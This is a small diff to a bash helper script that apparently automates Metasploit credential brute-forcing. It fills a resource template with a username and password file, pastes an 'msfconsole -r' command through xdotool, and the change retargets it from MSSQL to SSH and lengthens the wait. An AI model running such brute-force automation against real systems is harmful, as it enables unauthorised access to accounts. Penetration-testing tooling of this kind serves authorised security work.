@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-mssql: bruteforce username and passwords file
+ssh: bruteforce username and passwords file
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
@@ -27,5 +27,5 @@ replace_in_file "${SRC_FILE}" "${TMP_FILE}" "[USERNAME]"  "${USERNAME}"  "[PASS_
 paste_command "msfconsole -r ${TMP_FILE}"
 xdotool key Return
 
-sleep 30
+sleep 120
 rm $TMP_FILE
